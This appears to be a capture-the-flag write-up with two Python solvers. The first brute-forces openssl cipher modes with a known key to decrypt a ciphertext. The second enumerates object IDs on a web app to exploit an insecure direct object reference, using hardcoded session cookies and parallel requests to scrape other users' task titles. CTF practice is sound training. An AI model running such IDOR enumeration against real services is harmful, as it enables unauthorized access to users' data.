## Find Me If You Can

### Attachment
```
ciphertext = U2FsdGVkX18SV9pvdBCsaOYfPL294owVnNzxVrk1jRcvQunkRoa6MVIm2rdmthwhFCeamdEzYaCx40cOPgfB4w==

key = h4ckm31fy0uc4n
```
### Solver
```python

import subprocess

algo = ["aes-128-cbc", "aes-128-ecb", "aes-192-cbc",
        "aes-192-ecb", "aes-256-cbc", "aes-256-ecb",
        "aria-128-cbc", "aria-128-cfb", "aria-128-cfb1",
        "aria-128-cfb8", "aria-128-ctr", "aria-128-ecb",
        "aria-128-ofb", "aria-192-cbc", "aria-192-cfb",
        "aria-192-cfb1", "aria-192-cfb8", "aria-192-ctr",
        "aria-192-ecb", "aria-192-ofb", "aria-256-cbc",
        "aria-256-cfb", "aria-256-cfb1", "aria-256-cfb8",
        "aria-256-ctr", "aria-256-ecb", "aria-256-ofb",
        "base64", "bf", "bf-cbc", "bf-cfb", "bf-ecb",
        "bf-ofb", "camellia-128-cbc", "camellia-128-ecb",
        "camellia-192-cbc", "camellia-192-ecb", "camellia-256-cbc",
        "camellia-256-ecb", "cast", "cast-cbc", "cast5-cbc",
        "cast5-cfb", "cast5-ecb", "cast5-ofb", "des",
        "des-cbc", "des-cfb", "des-ecb", "des-ede",
        "des-ede-cbc", "des-ede-cfb", "des-ede-ofb",
        "des-ede3", "des-ede3-cbc", "des-ede3-cfb",
        "des-ede3-ofb", "des-ofb", "des3", "desx", "rc2",
        "rc2-40-cbc", "rc2-64-cbc", "rc2-cbc", "rc2-cfb",
        "rc2-ecb", "rc2-ofb", "rc4", "rc4-40", "seed",
        "seed-cbc", "seed-cfb", "seed-ecb", "seed-ofb",
        "sm4-cbc", "sm4-cfb", "sm4-ctr", "sm4-ecb", "sm4-ofb"]
for i in algo:
    s = subprocess.Popen(f"openssl enc -d -{i} -k 'h4ckm31fy0uc4n' -in file",
                         shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    s = s.stdout.read().decode("latin-1")
    if "anno" in s:
        print(s)
```

## welcome todo

### solver

```python
import requests
import re
import multiprocessing

URL = "http://101.50.0.66:8000"

COOKIE = {
    "csrftoken":"YhrjTEoEhsktk0wJZgnhfamNjxuPuRSgYXkYJDLFcgTtb0s0akgv2QqwtUIlHZRy",
    "sessionid":"t4g4fxasun5sl9pbsqkghjmeu8sddv26",
}
def brute_idor(num):
    r = requests.get(URL+f"/task-update/{num}/", cookies=COOKIE)
    if r.status_code != 404:
        print("==>"+num)
        # r = re.findall(r'(.*?)</textarea>', r.text)
        r = re.findall(r'(.*?)id="id_title">', r.text)
        print(r)

for i in range(1, 9999):
    num = '{}'.format(str(i).zfill(4))
    print(num, end="\r")
    p = multiprocessing.Process(target=brute_idor, args=(num,))
    p.start()
    if i % 10 == 0:
        p.join()
```